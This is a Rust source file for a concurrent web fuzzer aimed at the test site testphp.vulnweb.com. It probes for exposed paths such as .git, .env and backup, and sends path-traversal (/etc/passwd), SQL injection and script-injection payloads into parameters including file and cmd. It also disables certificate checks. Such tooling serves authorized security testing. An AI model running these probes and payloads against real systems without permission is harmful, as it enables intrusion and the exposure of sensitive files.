use reqwest;
use tokio;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;
use std::collections::HashMap;

#[derive(Clone)]
struct Fuzzer {
    client: reqwest::Client,
    wordlist: Vec<String>,
    target: String,
}

impl Fuzzer {
    fn new(target: String) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
            
        let wordlist = vec![
            "admin".to_string(),
            "login".to_string(),
            "config".to_string(),
            "backup".to_string(),
            ".git".to_string(),
            ".env".to_string(),
            "phpinfo".to_string(),
        ];
        
        Fuzzer {
            client,
            wordlist,
            target,
        }
    }
    
    async fn fuzz_directory(&self, path: &str) -> Result<(u16, usize), reqwest::Error> {
        let url = format!("{}/{}", self.target, path);
        let response = self.client.get(&url).send().await?;
        let status = response.status().as_u16();
        let content_length = response.content_length().unwrap_or(0) as usize;
        
        Ok((status, content_length))
    }
    
    async fn fuzz_parameters(&self, param: &str, value: &str) -> Result<(u16, String), reqwest::Error> {
        let mut params = HashMap::new();
        params.insert(param, value);
        
        let response = self.client
            .get(&self.target)
            .query(&params)
            .send()
            .await?;
            
        let status = response.status().as_u16();
        let body = response.text().await.unwrap_or_default();
        
        Ok((status, body))
    }
    
    async fn run_fuzzer(&self, max_concurrent: usize) {
        println!("Starting fuzzer for: {}", self.target);
        println!("=====================================");
        
        let semaphore = Arc::new(Semaphore::new(max_concurrent));
        let mut tasks = Vec::new();
        
        // Directory fuzzing
        for word in &self.wordlist {
            let fuzzer = self.clone();
            let word = word.clone();
            let permit = Arc::clone(&semaphore).acquire_owned().await.unwrap();
            
            tasks.push(tokio::spawn(async move {
                match fuzzer.fuzz_directory(&word).await {
                    Ok((status, length)) => {
                        if status != 404 {
                            println!("[DIR] {} -> Status: {}, Length: {}", word, status, length);
                        }
                    }
                    Err(e) => println!("Error fuzzing {}: {}", word, e),
                }
                drop(permit);
            }));
        }
        
        // Parameter fuzzing
        let test_params = vec!["id", "file", "page", "view", "cmd"];
        let test_values = vec!["../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"];
        
        for param in test_params {
            for value in &test_values {
                let fuzzer = self.clone();
                let param = param.to_string();
                let value = value.to_string();
                let permit = Arc::clone(&semaphore).acquire_owned().await.unwrap();
                
                tasks.push(tokio::spawn(async move {
                    match fuzzer.fuzz_parameters(&param, &value).await {
                        Ok((status, body)) => {
                            if body.contains("root:") || body.contains("alert") || body.len() > 10000 {
                                println!("[PARAM] {}={} -> Status: {}, Interesting response!", 
                                       param, value, status);
                            }
                        }
                        Err(e) => println!("Error: {}", e),
                    }
                    drop(permit);
                }));
            }
        }
        
        for task in tasks {
            let _ = task.await;
        }
    }
}

#[tokio::main]
async fn main() {
    let fuzzer = Fuzzer::new("http://testphp.vulnweb.com".to_string());
    fuzzer.run_fuzzer(10).await;
}